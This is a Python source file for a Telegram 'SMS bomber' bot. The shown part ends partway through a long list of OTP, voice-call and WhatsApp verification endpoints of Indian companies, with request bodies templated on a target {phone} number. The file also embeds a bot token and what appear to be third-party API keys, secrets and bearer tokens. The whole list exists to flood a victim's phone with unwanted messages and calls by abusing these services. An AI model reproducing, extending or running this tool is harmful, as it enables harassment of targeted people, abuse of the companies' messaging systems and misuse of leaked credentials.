#!/usr/bin/env python3
"""
SMS BOMBER TELEGRAM BOT (Full APIs)
"""

import os
import logging
import asyncio
import aiohttp
import random
import uuid
import time
from datetime import datetime
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, ContextTypes
from telegram.constants import ParseMode

# ============================================================
# 🔥 CONFIG
# ============================================================
BOT_TOKEN = "9044163168:AAGPJDBZiK7LeA6ejRdS_OajKDzxWQs6nco"  # <--- APNA TOKEN DAALO
MAX_CONCURRENT = 30 
PER_API_TIMEOUT = 6  

logging.basicConfig(format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
                    level=logging.INFO)
logger = logging.getLogger(__name__)

# ============================================================
# 🔥 ALL APIs LIST (From your files)
# ============================================================
APIS = [
    # --- CALL APIs ---
    {"name": "TataCapital_Call", "url": "https://mobapp.tatacapital.com/DLPDelegator/authentication/mobile/v0.1/sendOtpOnVoice", "method": "POST", "headers": {"Content-Type": "application/json"}, "body": '{"phone":"{phone}","isOtpViaCallAtLogin":"true"}'},
    {"name": "1MG_Call", "url": "https://www.1mg.com/auth_api/v6/create_token", "method": "POST", "headers": {"Content-Type": "application/json"}, "body": '{"number":"{phone}","otp_on_call":true}'},
    {"name": "Swiggy_Call", "url": "https://profile.swiggy.com/api/v3/app/request_call_verification", "method": "POST", "headers": {"Content-Type": "application/json"}, "body": '{"mobile":"{phone}"}'},
    {"name": "Flipkart_Call", "url": "https://2.rome.api.flipkart.com/api/4/user/otp/generate", "method": "POST", "headers": {"Content-Type": "application/json"}, "body": '{"mobileNumber":"{phone}"}'},
    {"name": "Paytm_Call", "url": "https://accounts.paytm.com/signin/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "body": '{"phone":"{phone}","loginData":"LOGIN_USING_PHONE"}'},
    {"name": "Zomato_Call", "url": "https://www.zomato.com/php/asyncLogin.php", "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded"}, "body": "phone={phone}"},
    {"name": "MakeMyTrip_Call", "url": "https://www.makemytrip.com/api/umbrella/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "body": '{"mobile":"{phone}"}'},
    {"name": "Uber_Call", "url": "https://auth.uber.com/v2/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "body": '{"mobile":"{phone}"}'},
    {"name": "BigBasket_Call", "url": "https://www.bigbasket.com/bb-oauth/api/v2.0/otp/generate/", "method": "POST", "headers": {"Content-Type": "application/json"}, "body": '{"mobile_number":"{phone}"}'},
    {"name": "PhonePe_Call", "url": "https://www.phonepe.com/api/v2/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "body": '{"phone":"{phone}"}'},
    {"name": "OYO_Call", "url": "https://api.oyoroomscrm.com/api/v2/user/send_otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "body": '{"phone":"{phone}"}'},
    {"name": "Rapido_Call", "url": "https://rapido.bike/api/v2/otp/generate", "method": "POST", "headers": {"Content-Type": "application/json"}, "body": '{"mobile":"{phone}"}'},
    {"name": "BookMyShow_Call", "url": "https://in.bmscdn.com/mjson/User/SendOTP", "method": "POST", "headers": {"Content-Type": "application/json"}, "body": '{"mobileNo":"{phone}"}'},
    {"name": "Meesho_Call", "url": "https://api.meesho.com/v2/auth/send_otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "body": '{"phone":"{phone}"}'},
    {"name": "Snapdeal_Call", "url": "https://www.snapdeal.com/authenticate", "method": "POST", "headers": {"Content-Type": "application/json"}, "body": '{"mobile":"{phone}"}'},
    {"name": "Croma_Call", "url": "https://api.croma.com/otp/generate", "method": "POST", "headers": {"Content-Type": "application/json"}, "body": '{"phone":"{phone}"}'},
    {"name": "Jio_Call", "url": "https://www.jio.com/api/jio-login-service/login/sendOtp", "method": "POST", "headers": {"Content-Type": "application/json"}, "body": '{"mobileNumber":"{phone}","loginFlowType":"MOBILE","alternateNumber":""}'},
    {"name": "SonyLiv_Call", "url": "https://apiv2.sonyliv.com/AGL/2.8/A/ENG/MWEB/IN/UP/CREATEOTP-V2", "method": "POST", "headers": {"Content-Type": "application/json", "app_version": "3.8.3"}, "body": '{"mobileNumber":"{phone}","smsType":"Voice","channelPartnerID":"MSMIND","country":"IN","timestamp":"{timestamp}","otpSize":4,"isMobileMandatory":true,"loginType":"REGISTERORSIGNIN"}'},
    {"name": "Snitch_Call", "url": "https://www.snitch.com/api/auth/resend-otp?mode=voice", "method": "POST", "headers": {"Content-Type": "application/json", "X-CAP-Token": "015a4adb4fcebceb:dcd8d06bbd9311f025af80eaeeb8e0"}, "body": '{"mobile_number":"+91{phone}"}'},
    {"name": "Ixigo_Call", "url": "https://www.ixigo.com/api/v4/oauth/dual/mobile/send-otp", "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded"}, "body": 'token=0732ff21f3263cee48320831c049192e22ffa805b4ca14add9c963945e4de6dde05739779f718e1fe35faa7297ac035389752adfda0548baf249b0d9fdc6a05f&sixDigitOTP=true&prefix=%2B91&phone={phone}&resendOnCall=true'},
    {"name": "Hotstar_Call", "url": "https://web.hotstar.com/api/internal/bff/v2/pages/1/spaces/1/widgets/8?action=resendOtp", "method": "POST", "headers": {"Content-Type": "application/json", "x-hs-platform": "mweb", "x-country-code": "in"}, "body": '{"body":{"@type":"type.googleapis.com/feature.login.InitiatePhoneLoginRequest","phone_number":"{phone}","initiate_by":1,"recaptcha_token":"","source":0}}'},

    # --- WHATSAPP APIs ---
    {"name": "KPN_WhatsApp", "url": "https://api.kpnfresh.com/s/authn/api/v1/otp-generate?channel=WEB", "method": "POST", "headers": {"Content-Type": "application/json"}, "body": '{"phone_number":{"number":"{phone}","country_code":"+91"}}'},
    {"name": "EkaCare_WhatsApp", "url": "https://auth.eka.care/auth/init", "method": "POST", "headers": {"Content-Type": "application/json"}, "body": '{"payload":{"allowWhatsapp":true,"mobile":"+91{phone}"},"type":"mobile"}'},
    {"name": "MamaEarth_WA", "url": "https://auth.mamaearth.in/v1/auth/initiate-signup", "method": "POST", "headers": {"Content-Type": "application/json"}, "body": '{"mobile":"{phone}"}'},
    {"name": "Havells_WA", "url": "https://havells.com/otplogin/account/otploginpost/", "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded"}, "body": "form_key=GvFYqgGVWCkuLoNT&mobile_number={phone}&is_whatsapp_promo=on"},
    {"name": "HeroFinCorp_WA", "url": "https://loans.apps.herofincorp.com/api/generateOtp", "method": "POST", "headers": {"Content-Type": "application/json"}, "body": '{"phone":"{phone}","terms":true,"whatsapp":true}'},
    {"name": "Astroyogi_WA", "url": "https://comm.astroyogi.com/api/OtpComm/SendOtp", "method": "POST", "headers": {"Content-Type": "application/json", "Authorization": "Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJVc2VyVHlwZSI6IldlYlVzZXIiLCJFbnRpdHlJZCI6IjAiLCJTb3VyY2VVc2VyVHlwZSI6IiIsIlNvdXJjZUVudGl0eUlkIjoiIiwibmJmIjoxNzgwMTY4NDY1LCJleHAiOjE3ODc5NDQ0NjV9."}, "body": '{"phoneCode":"91","countryCode":"IN","mobileNumber":"{phone}","platform":"Web","IpAddress":"117.225.1.174","requestType":"whatsapp","countryCodeByHeader":"IN"}'},
    {"name": "Refyne_WA", "url": "https://prod-api.refyne.co.in/auth/v3/send-otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "body": '{"channel":"WHATSAPP","recipient":"{phone}"}'},
    {"name": "MakeMyTrip_WA", "url": "https://mapi.makemytrip.com/ext/web/pwa/send/token/SIGNUP_OTP?region=in&language=eng&currency=inr", "method": "POST", "headers": {"Content-Type": "application/json", "vid": "{uuid}", "tid": "{uuid}", "deviceid": "{uuid}", "region": "in", "language": "eng", "currency": "inr"}, "body": '{"loginId":"{phone}","type":6,"isEncoded":false,"channel":["MOBILE","WHATSAPP"],"appHashKey":"@www.makemytrip.com #","countryCode":"91"}'},
    {"name": "Housing_WA", "url": "https://mightyzeus-mum.housing.com/api/gql?apiName=LOGIN_SEND_OTP_API", "method": "POST", "headers": {"Content-Type": "application/json", "phoenix-api-name": "LOGIN_SEND_OTP_API", "app-name": "mobile_web_buyer"}, "body": '{"query":"mutation($email:String,$phone:String,$otpLength:Int,$userAgent:String,$method:String,$preference:String,$channel:String){sendOtp(phone:$phone,email:$email,otpLength:$otpLength,userAgent:$userAgent,method:$method,preference:$preference,channel:$channel){success message}}","variables":{"phone":"{phone}","userAgent":"Mozilla/5.0","otpLength":4,"preference":"whatsapp"}}'},
    {"name": "HERE_WA", "url": "https://app-api.here.co.in/users/v1/customer-portal/send-otp-for-portal", "method": "POST", "headers": {"Content-Type": "application/json"}, "body": '{"mobile":"{phone}","countryCodeId":"b43569eb-6798-43fb-8d27-47d55d7c544b","source":"whatsapp"}'},
    {"name": "VisitApp_WA", "url": "https://api.getvisitapp.com/v3/new-auth/login-phone", "method": "POST", "headers": {"Content-Type": "application/json"}, "body": '{"channel":"whatsapp","resend":true,"countryCode":91,"phone":"{phone}","platform":"WEB"}'},
    {"name": "RegistaniaChar_WA", "url": "https://admin.registaniachar.com/api/whatsapp/send-otp", "method": "POST", "headers": {"Content-Type": "application/json", "X-Signature": "6d31a2232ee5ec6e868d2eade30e657ddce8f6ff4b417818313feef6a220a553"}, "body": '{"phone":"{phone}"}'},
    {"name": "MuscleBlaze_WA", "url": "https://www.muscleblaze.com/veronica/user/validate/whatsapp/9/{phone}/signup?plt=2&st=9", "method": "GET", "headers": {"HKAUTH": "396144437|9l7fQT5m5HJtTrXqRZiWdQ==", "pageuri": "/", "st": "9", "plt": "2"}, "body": None},

    # --- SMS APIs ---
    {"name": "Lenskart", "url": "https://api-gateway.juno.lenskart.com/v3/customers/sendOtp", "method": "POST", "headers": {"Content-Type": "application/json"}, "body": '{"phoneCode":"+91","telephone":"{phone}"}'},
    {"name": "NoBroker", "url": "https://www.nobroker.in/api/v3/account/otp/send", "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded"}, "body": "phone={phone}&countryCode=IN"},
    {"name": "PharmEasy", "url": "https://pharmeasy.in/api/v2/auth/send-otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "body": '{"phone":"{phone}"}'},
    {"name": "Wakefit", "url": "https://api.wakefit.co/api/consumer-sms-otp/", "method": "POST", "headers": {"Content-Type": "application/json"}, "body": '{"mobile":"{phone}"}'},
    {"name": "Meru", "url": "https://merucabapp.com/api/otp/generate", "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded"}, "body": "mobile_number={phone}"},
    {"name": "Doubtnut", "url": "https://api.doubtnut.com/v4/student/login", "method": "POST", "headers": {"Content-Type": "application/json"}, "body": '{"phone_number":"{phone}","language":"en"}'},
    {"name": "ShipRocket", "url": "https://sr-wave-api.shiprocket.in/v1/customer/auth/otp/send", "method": "POST", "headers": {"Content-Type": "application/json"}, "body": '{"mobileNumber":"{phone}"}'},
    {"name": "Servetel", "url": "https://api.servetel.in/v1/auth/otp", "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded"}, "body": "mobile_number={phone}"},
    {"name": "Snitch", "url": "https://mxemjhp3rt.ap-south-1.awsapprunner.com/auth/otps/v2", "method": "POST", "headers": {"Content-Type": "application/json"}, "body": '{"mobile_number":"+91{phone}"}'},
    {"name": "Housing", "url": "https://login.housing.com/api/v2/send-otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "body": '{"phone":"{phone}","country_url_name":"in"}'},
    {"name": "RentoMojo", "url": "https://www.rentomojo.com/api/RMUsers/isNumberRegistered", "method": "POST", "headers": {"Content-Type": "application/json"}, "body": '{"phone":"{phone}"}'},
    {"name": "Khatabook", "url": "https://api.khatabook.com/v1/auth/request-otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "body": '{"phone":"{phone}","app_signature":"wk+avHrHZf2"}'},
    {"name": "Nykaa", "url": "https://www.nykaa.com/app-api/index.php/customer/send_otp", "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded"}, "body": "source=sms&mobile_number={phone}"},
    {"name": "RummyCircle", "url": "https://www.rummycircle.com/api/fl/auth/v3/getOtp", "method": "POST", "headers": {"Content-Type": "application/json"}, "body": '{"mobile":"{phone}","isPlaycircle":false}'},
    {"name": "Cosmofeed", "url": "https://prod.api.cosmofeed.com/api/user/authenticate", "method": "POST", "headers": {"Content-Type": "application/json"}, "body": '{"phone":"{phone}","version":"1.4.28"}'},
    {"name": "Revv", "url": "https://st-core-admin.revv.co.in/stCore/api/customer/v1/init", "method": "POST", "headers": {"Content-Type": "application/json"}, "body": '{"mobile":"{phone}","deviceType":"website"}'},
    {"name": "PayMe_India", "url": "https://api.paymeindia.in/api/v2/authentication/phone_no_verify/", "method": "POST", "headers": {"Content-Type": "application/json"}, "body": '{"phone":"{phone}","app_signature":"S10ePIIrbH3"}'},
    {"name": "PaisaOnSalary", "url": "https://cms.paisaonsalary.com/api/Api/Website/InstantJourneyController/appCustomerRegisteration", "method": "POST", "headers": {"Content-Type": "application/json", "origin": "https://www.paisaonsalary.com", "referer": "https://www.paisaonsalary.com/"}, "body": '{"mobile":"{phone}","event_name":"login","utm_source":"","utm_medium":"","utm_campaign":"","utm_term":"","utm_content":""}'},
    {"name": "PaisaBoxx", "url": "https://api.paisaboxx.com/identity/UserAuth/loginWithMobile?country_code=91&mobile={phone}&partner_id=6350faa323&source=hexa&campaign=delhi_5499", "method": "POST", "headers": {"Content-Type": "application/json", "Content-Length": "0", "origin": "https://www.paisaboxx.com", "referer": "https://www.paisaboxx.com/"}, "body": "{}"},
    {"name": "LoanZap", "url": "https://webapi.loanzap.in/v2/apply-loan/register-user", "method": "POST", "headers": {"Content-Type": "application/json", "origin": "https://www.loanzap.in", "referer": "https://www.loanzap.in/"}, "body": '{"name":"Binod","mobile":"{phone}","email":"test@gmail.com","terms":"1"}'},
    {"name": "CashKredit", "url": "https://api.cashkredit.in/v2/apply-loan/register-user", "method": "POST", "headers": {"Content-Type": "application/json", "origin": "https://www.cashkredit.in", "referer": "https://www.cashkredit.in/"}, "body": '{"pan":"ABCDE1234F","name":"Binod","mobile":"{phone}","email":"test@gmail.com","terms":"1"}'},
    {"name": "RupeeLending", "url": "https://rupeelending.com/apply-now/send-otp", "method": "POST", "headers": {"Content-Type": "application/json", "origin": "https://rupeelending.com", "referer": "https://rupeelending.com/apply-now"}, "body": '{"mobile":"{phone}"}'},
    {"name": "BrightLoans", "url": "https://brightloans.in/login-sbm", "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded", "origin": "https://brightloans.in", "referer": "https://brightloans.in/apply-now"}, "body": "mobile={phone}&current_page=login&is_existing_customer=2&device_id={random_md5}"},
    {"name": "SalaryTopUp", "url": "https://salarytopup.in/api/Api/Website/InstantJourneyController/appCustomerRegisteration", "method": "POST", "headers": {"Content-Type": "application/json", "Auth": "MjQ4ZmY5MGM0MmM2N2EyOTJlZWE0MTBiNGU2Y2Q2NzU=", "origin": "https://salarytopup.com", "referer": "https://salarytopup.com/"}, "body": '{"mobile":"{phone}","event_name":"login","utm_source":"","utm_medium":"","utm_campaign":"","utm_term":"","utm_content":""}'},
    {"name": "TezCredit", "url": "https://api.tezcredit.com/identity/UserAuth/loginWithMobile?country_code=91&mobile={phone}", "method": "POST", "headers": {"Content-Type": "application/json", "origin": "https://www.tezcredit.com", "referer": "https://www.tezcredit.com/", "Content-Length": "0"}, "body": "{}"},
    {"name": "Swiggy_SMS", "url": "https://www.swiggy.com/mapi/auth/sms-otp", "method": "POST", "headers": {"Content-Type": "application/json", "origin": "https://www.swiggy.com", "referer": "https://www.swiggy.com/auth"}, "body": '{"mobile":"{phone}","_csrf":"wYqwp6Boyjtu-la46bXHvrfnJrrsKmi4MmM3RTGk"}'},
    {"name": "TataCapital_HL", "url": "https://hlonline.tatacapital.com/APILayer/dlp/otp/services/generateOtp", "method": "POST", "headers": {"Content-Type": "application/json", "origin": "https://www.tatacapital.com", "referer": "https://www.tatacapital.com/"}, "body": '{"mobileNumber":"{phone}","isNew":1,"deviceOs":"web","sourceName":"Website","webOsCapture":"Linux aarch64","deviceCapture":"Web-Android"}'},
    {"name": "TataCapital_PL", "url": "https://mobapp.tatacapital.com/DLPDelegator/authentication/mobile/v0.1/generateOtp", "method": "POST", "headers": {"Content-Type": "application/json", "origin": "https://www.tatacapital.com", "referer": "https://www.tatacapital.com/"}, "body": '{"mobileNumber":"{phone}","deviceOS":"Web","applSource":"PL","deviceType":"Web","deviceSubType":""}'},
    {"name": "TataCapital_LAP", "url": "https://onlinelaploans.tatacapital.com/APILayer/dlp/otp/services/generateOtp", "method": "POST", "headers": {"Content-Type": "application/json", "origin": "https://www.tatacapital.com", "referer": "https://www.tatacapital.com/"}, "body": '{"mobileNumber":"{phone}","isNew":1,"deviceOs":"web","webOsCapture":"Linux aarch64","deviceCapture":"Web-Android"}'},
    {"name": "Univest", "url": "https://api.univest.in/api/auth/send-otp?type=web4&countryCode=91&contactNumber={phone}", "method": "GET", "headers": {"origin": "https://univest.in", "referer": "https://univest.in/"}, "body": None},
    {"name": "HeroFinCorp_Festive", "url": "https://festive.api.herofincorp.com/v1/customer/otp/{phone}", "method": "GET", "headers": {"origin": "https://festive.herofincorp.com", "referer": "https://festive.herofincorp.com/"}, "body": None},
    {"name": "MuscleBlaze", "url": "https://www.muscleblaze.com/veronica/user/validate/9/{phone}/signup?plt=2&st=9", "method": "GET", "headers": {"origin": "https://www.muscleblaze.com", "referer": "https://www.muscleblaze.com/", "HKAUTH": "396144437|9l7fQT5m5HJtTrXqRZiWdQ==", "pageuri": "/", "st": "9", "plt": "2"}, "body": None},
    {"name": "INRFlash", "url": "https://offers.inrflash.com/campinr/index.php", "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded", "origin": "https://offers.inrflash.com", "referer": "https://offers.inrflash.com/campinr/index.php"}, "body": "action=send_otp&phoneNo={phone}"},
    {"name": "MuthootFinance", "url": "https://www.muthootfinance.com/smsapi.php", "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded", "origin": "https://www.muthootfinance.com", "referer": "https://www.muthootfinance.com/services/Insta-OD/"}, "body": "mobile={phone}&pin=Xmd6TERfO1haXjo3"},
    {"name": "Factori", "url": "https://factori.com/login/check_user_exists", "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded", "origin": "https://factori.com", "referer": "https://factori.com/my-account"}, "body": "mobNumber={phone}&countryCode=91"},
    {"name": "Zepto", "url": "https://bff-gateway.zepto.com/api/v1/user/customer/send-otp-sms/", "method": "POST", "headers": {"Content-Type": "application/json", "origin": "https://www.zepto.com", "referer": "https://www.zepto.com/", "X-Requested-With": "via.bolte"}, "body": '{"mobileNumber":"{phone}"}'},
    {"name": "OneMG", "url": "https://www.1mg.com/auth_api/v6/create_token", "method": "POST", "headers": {"Content-Type": "application/json", "origin": "https://www.1mg.com", "referer": "https://www.1mg.com/"}, "body": '{"number":"{phone}"}'},
    {"name": "GoKwik", "url": "https://gkx.gokwik.co/v3/gkstrict/auth/otp/send", "method": "POST", "headers": {"Content-Type": "application/json", "origin": "https://gokwik.co", "referer": "https://gokwik.co/"}, "body": '{"phone":"{phone}","country":"in"}'},
    {"name": "EntriApp", "url": "https://entri.app/api/v3/users/check-phone/", "method": "POST", "headers": {"Content-Type": "application/json", "origin": "https://learn.entri.app", "referer": "https://learn.entri.app/"}, "body": '{"phone":"+91{phone}","recaptcha_response":"dummy_token"}'},
    {"name": "Apna", "url": "https://production.apna.co/api/userprofile/v1/otp/", "method": "POST", "headers": {"Content-Type": "application/json", "origin": "https://apna.co", "referer": "https://apna.co/"}, "body": '{"hash_type":"original","phone_number":"91{phone}","request_id":"{timestamp}","retries":0}'},
    {"name": "DigiCredit", "url": "https://customer-backend.digicredit.in/customers/customer-login", "method": "POST", "headers": {"Content-Type": "application/json", "client-id": "7de19504-f422-42dc-bd51-5ed5dfb170c1", "origin": "https://applyloan.digicredit.in", "referer": "https://applyloan.digicredit.in/"}, "body": '{"phoneNo":"{phone}","journey_down":"true"}'},
    {"name": "Moglix", "url": "https://apinew.moglix.com/nodeApi/v1/login/sendOtpV2", "method": "POST", "headers": {"Content-Type": "application/json", "x-platform": "PWA", "origin": "https://www.moglix.com", "referer": "https://www.moglix.com/"}, "body": '{"email":"","phone":"{phone}","type":"p","source":"signup","buildVersion":"37.3.1","metaSource":"","device":"mobile"}'},
    {"name": "Housing2", "url": "https://mightyzeus-mum.housing.com/api/gql?apiName=LOGIN_SEND_OTP_API", "method": "POST", "headers": {"Content-Type": "application/json", "app-name": "mobile_web_buyer", "origin": "https://housing.com", "referer": "https://housing.com/"}, "body": '{"query":"mutation($phone:String){sendOtp(phone:$phone){success message}}","variables":{"phone":"{phone}"}}'},
    {"name": "MyMoneyBazaar", "url": "https://mm-app-backend.mymoneybazaar.com/api/v2/authentication/phone_no_verify/", "method": "POST", "headers": {"Content-Type": "application/json", "origin": "https://web.mymoneybazaar.com", "referer": "https://web.mymoneybazaar.com/"}, "body": '{"phone_number":"{phone}"}'},
    {"name": "Shopsy", "url": "https://www.shopsy.in/1.rome/api/1/action/view", "method": "POST", "headers": {"Content-Type": "application/json", "origin": "https://www.shopsy.in", "referer": "https://www.shopsy.in/login"}, "body": '{"actionRequestContext":{"loginId":"{phone}","loginType":"MOBILE","verificationType":"OTP","type":"LOGIN_IDENTITY_VERIFY"}}'},
    {"name": "KamakshiMoney", "url": "https://loan-api.kamakshimoney.com/customers/customer-login-byMobile?utm_source=google_kamakshi_Pmax_Disbursal_web", "method": "POST", "headers": {"Content-Type": "application/json", "origin": "https://loan.kamakshimoney.com", "referer": "https://loan.kamakshimoney.com/"}, "body": '{"mobile":"{phone}"}'},
    {"name": "PrimeCash", "url": "https://api.primecash.app/api/v1/user", "method": "POST", "headers": {"Content-Type": "application/json"}, "body": '{"mobile":"{phone}","isTNCVerified":true,"hash":"O9BmoTki4+6"}'},
    {"name": "Allen", "url": "https://api.allen-live.in/api/v1/auth/sendOtp?center_id=&source=home-page-login", "method": "POST", "headers": {"Content-Type": "application/json", "x-device-id": "9aad014a-4181-4fe7-99e1-9ac721e538b4", "x-client-type": "mweb", "origin": "https://allen.in", "referer": "https://allen.in/"}, "body": '{"country_code":"91","phone_number":"{phone}","persona_type":"STUDENT","otp_type":"SHARED_DEFAULT"}'},
    {"name": "RupeeCare", "url": "https://rc-backend.root.deployment.rupeecare.money/api/auth/get_otp", "method": "POST", "headers": {"Content-Type": "application/json", "client-id": "d8247367-fabd-48c1-8314-ea00b431c232", "origin": "https://rupeecare.money", "referer": "https://rupeecare.money/"}, "body": '{"phoneNo":"{phone}","clientId":"d8247367-fabd-48c1-8314-ea00b431c232"}'},
    {"name": "Rupyalelo", "url": "https://apply.rupyalelo.com/api/login", "method": "POST", "headers": {"Content-Type": "application/json", "origin": "https://apply.rupyalelo.com", "referer": "https://apply.rupyalelo.com/auth"}, "body": '{"mobile":"{phone}"}'},
    {"name": "RoopyaMoney", "url": "https://api.roopya.money/api/v2/customer/lead", "method": "POST", "headers": {"Content-Type": "application/json", "apiSecret": "3acd32a5276b6b968028c2e7d6471051d5df9771d9049e2fc317b8e93113bdcc", "apiKey": "0025f469f0e293c539a207f2aaaa85c75f1c30191c31c44cc010c3b076ee1216", "origin": "https://salarychampion.roopya.money", "referer": "https://salarychampion.roopya.money/"}, "body": '{"phone":"{phone}","countryCode":"+91","ip":"152.58.58.64"}'},
    {"name": "Dhanrishi", "url": "https://ub1.dhanrishi.com/api/user/send-otp", "method": "POST", "headers": {"Content-Type": "application/json", "origin": "https://dhanrishi.com", "referer": "https://dhanrishi.com/"}, "body": '{"PAN":"ABCDE1234F","phone_number":"{phone}"}'},
    {"name": "SalaryOnTime", "url": "https://journey.sotcrm.com/api/v1/journey-auth/send-otp/", "method": "POST", "headers": {"Content-Type": "application/json", "origin": "https://salaryontime.com", "referer": "https://salaryontime.com/"}, "body": '{"mobile":"{phone}","utmSource":"","utmMedium":"","utmCampaign":"","utmTerm":"","sourceId":1}'},
    {"name": "SpeedoLoan", "url": "https://loanapply.speedoloan.com/api/login", "method": "POST", "headers": {"Content-Type": "application/json", "origin": "https://loanapply.speedoloan.com", "referer": "https://loanapply.speedoloan.com/auth"}, "body": '{"mobile":"{phone}"}'},
    {"name": "FastSalary", "url": "https://apilm.fastsalary.com/api/v2/auth/send-signup", "method": "POST", "headers": {"Content-Type": "application/json", "domain": "app.fastsalary.com", "origin": "https://app.fastsalary.com", "referer": "https://app.fastsalary.com/"}, "body": '{"phoneNumber":"+91{phone}","email":"test@gmail.com","occupationTypeId":"7","monthlySalary":"546481","panCard":"GDODJ5434B","brandId":"676027d3-a43c-4716-9663-7272f5df1ac7","domain":"app.fastsalary.com"}'},
    {"name": "CredNidhi", "url": "https://apilm.crednidhi.com/api/v2/auth/send-signup", "method": "POST", "headers": {"Content-Type": "application/json", "domain": "app.crednidhi.com", "origin": "https://app.crednidhi.com", "referer": "https://app.crednidhi.com/"}, "body": '{"phoneNumber":"+91{phone}","email":"test@gmail.com","occupationTypeId":"7","monthlySalary":"50000","panCard":"HSOSN5464B","brandId":"5d8868eb-40e8-47f8-a497-cd2ce6216c4f","domain":"app.crednidhi.com"}'},
    {"name": "ClickMyLoan", "url": "https://appb.clickmyloan.com/api/v2/authentication/phone_no_verify/", "method": "POST", "headers": {"Content-Type": "application/json", "origin": "https://web.clickmyloan.com", "referer": "https://web.clickmyloan.com/"}, "body": '{"phone_number":"{phone}"}'},
    {"name": "SuryaLoan", "url": "https://microservices.suryaloan.com/api/v1/customer-journey/login", "method": "POST", "headers": {"Content-Type": "application/json; charset=UTF-8", "origin": "https://suryaloan.com", "referer": "https://suryaloan.com/"}, "body": '{"utmSource":"Value_Leaf","utmMedium":"GoogleBsub_id1}","utmCampaign":"pmax_personal","utmTerm":"836_01","utm_content":"","mobile":"{phone}","sourceId":1}'},
    {"name": "CreditSea", "url": "https://backend.creditsea.com/api/v1/otp/generate-otp", "method": "POST", "headers": {"Content-Type": "application/json", "platform": "CREDITSEA", "origin": "https://www.creditsea.com", "referer": "https://www.creditsea.com/"}, "body": '{"phoneNumber":"{phone}","isWebUser":true}'},
    {"name": "SalarySetu", "url": "https://backend.salarysetu.com/api/user/send-otp", "method": "POST", "headers": {"Content-Type": "application/json", "origin": "https://salarysetu.com", "referer": "https://salarysetu.com/"}, "body": '{"PAN":"ABCDE1234F","phone_number":"{phone}"}'},
    {"name": "ShreeLoan", "url": "https://loanapply.shreeloan.com/api/login", "method": "POST", "headers": {"Content-Type": "application/json", "origin": "https://loanapply.shreeloan.com", "referer": "https://loanapply.shreeloan.com/auth"}, "body": '{"mobile":"{phone}"}'},
    {"name": "PocketCredit", "url": "https://pocketcredit.in/api/auth/send-otp", "method": "POST", "headers": {"Content-Type": "application/json", "origin": "https://pocketcredit.in", "referer": "https://pocketcredit.in/auth"}, "body": '{"mobile":"{phone}"}'},
    {"name": "ClickForMoney", "url": "https://clickformoney.in/api/sendOtp", "method": "POST", "headers": {"Content-Type": "application/json", "origin": "https://clickformoney.in", "referer": "https://clickformoney.in/apply-now"}, "body": '{"phone":"{phone}"}'},
    {"name": "JhatpatCash", "url": "https://apilm.jhatpatcash.com/api/v2/auth/send-signup", "method": "POST", "headers": {"Content-Type": "application/json", "domain": "app.jhatpatcash.com", "origin": "https://app.jhatpatcash.com", "referer": "https://app.jhatpatcash.com/"}, "body": '{"phoneNumber":"+91{phone}","email":"test@gmail.com","occupationTypeId":"7","monthlySalary":"537078","panCard":"GSISB5468H","brandId":"d7c6bc00-9517-4d20-86f7-78b07f18a46d","domain":"app.jhatpatcash.com"}'},
    {"name": "QuaLoan", "url": "https://apilm.qualoan.com/api/v2/auth/send-signup", "method": "POST", "headers": {"Content-Type": "application/json", "domain": "app.qualoan.com", "origin": "https://app.qualoan.com", "referer": "https://app.qualoan.com/"}, "body": '{"phoneNumber":"+91{phone}","email":"test@gmail.com","occupationTypeId":"7","monthlySalary":"65000","panCard":"VUJVU5675H","brandId":"4b2f828d-e7d4-45d2-be7d-f2a0ee6a70ae","domain":"app.qualoan.com"}'},
    {"name": "NexiLoans", "url": "https://api-backend.nexiloans.com/user/otp/send", "method": "POST", "headers": {"Content-Type": "application/json", "origin": "https://apply.nexiloans.com", "referer": "https://apply.nexiloans.com/"}, "body": '{"mobile":"{phone}"}'},
    {"name": "ToofanLoan", "url": "https://apilm.toofanloan.com/api/v2/auth/send-signup", "method": "POST", "headers": {"Content-Type": "application/json", "domain": "app.toofanloan.com", "origin": "https://app.toofanloan.com", "referer": "https://app.toofanloan.com/"}, "body": '{"phoneNumber":"+91{phone}","email":"test@gmail.com","occupationTypeId":"7","monthlySalary":"52800","panCard":"TSISV5434B","brandId":"4dd2f611-32b6-42a4-a14b-d493dc885000","domain":"app.toofanloan.com"}'},
    {"name": "Rupee4u", "url": "https://loanapply.rupee4u.com/api/login", "method": "POST", "headers": {"Content-Type": "application/json", "origin": "https://loanapply.rupee4u.com", "referer": "https://loanapply.rupee4u.com/auth"}, "body": '{"mobile":"{phone}"}'},
    {"name": "PaisaPop", "url": "https://apilm.paisapop.com/api/v2/auth/send-signup", "method": "POST", "headers": {"Content-Type": "application/json", "domain": "web.paisapop.com", "origin": "https://web.paisapop.com", "referer": "https://web.paisapop.com/"}, "body": '{"phoneNumber":"+91{phone}","email":"test@gmail.com","occupationTypeId":"7","monthlySalary":"538355","panCard":"FUOUR2389B","brandId":"165a2d32-d1bd-4287-b2db-104a7feee308","domain":"web.paisapop.com"}'},
